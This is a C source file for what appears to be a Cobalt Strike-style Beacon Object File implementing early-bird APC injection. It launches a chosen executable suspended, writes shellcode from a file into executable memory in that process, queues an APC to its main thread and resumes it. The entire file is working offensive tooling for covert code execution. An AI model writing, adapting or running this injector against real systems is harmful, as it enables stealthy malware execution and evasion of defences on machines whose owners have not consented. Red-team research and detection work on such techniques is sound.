/*
 * bof-earlybird <executable> <shellcode-file> [arguments]
 *
 * Early-bird APC injection: create the target process suspended, write the
 * shellcode into it, queue an APC to its (not yet running) main thread, then
 * resume.  The APC fires before the process entry point ever executes.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    char *exe, *path, *extra = "";
    int elen, plen, xlen;
    unsigned char *sc = NULL;
    unsigned int sclen = 0;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    LPVOID remote;

    BeaconDataParse(&parser, args, alen);
    exe   = BeaconDataExtract(&parser, &elen);
    path  = BeaconDataExtract(&parser, &plen);
    extra = BeaconDataExtract(&parser, &xlen);
    if (!exe || !exe[0] || !path || !path[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: earlybird <executable> <shellcode-file> [args]\n");
        return;
    }
    if (!extra) extra = "";

    if (bof_read_file(path, &sc, &sclen) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "cannot read %s: %lu\n", path,
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    bof_memzero(&si, sizeof(si));
    bof_memzero(&pi, sizeof(pi));
    si.cb = sizeof(si);

    {
        char cmdline[1024];
        bof_strncpy(cmdline, "\"", sizeof(cmdline));
        bof_strncat(cmdline, exe, sizeof(cmdline) - bof_strlen(cmdline) - 1);
        bof_strncat(cmdline, "\" ", sizeof(cmdline) - bof_strlen(cmdline) - 1);
        bof_strncat(cmdline, extra, sizeof(cmdline) - bof_strlen(cmdline) - 1);

        if (!KERNEL32$CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                                     CREATE_SUSPENDED | CREATE_NO_WINDOW,
                                     NULL, NULL, &si, &pi)) {
            BeaconPrintf(CALLBACK_ERROR, "CreateProcess(%s) failed: %lu\n", exe,
                         (unsigned long)KERNEL32$GetLastError());
            KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
            return;
        }
    }

    remote = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, (SIZE_T)sclen,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    if (!KERNEL32$WriteProcessMemory(pi.hProcess, remote, sc, (SIZE_T)sclen, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$TerminateProcess(pi.hProcess, 1);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
        KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
        return;
    }

    if (!KERNEL32$QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "QueueUserAPC failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$TerminateProcess(pi.hProcess, 1);
    } else {
        KERNEL32$ResumeThread(pi.hThread);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] PID %lu spawned suspended, APC queued at 0x%p\n",
                     (unsigned long)pi.dwProcessId, remote);
    }

    KERNEL32$CloseHandle(pi.hThread);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$VirtualFree(sc, 0, MEM_RELEASE);
}
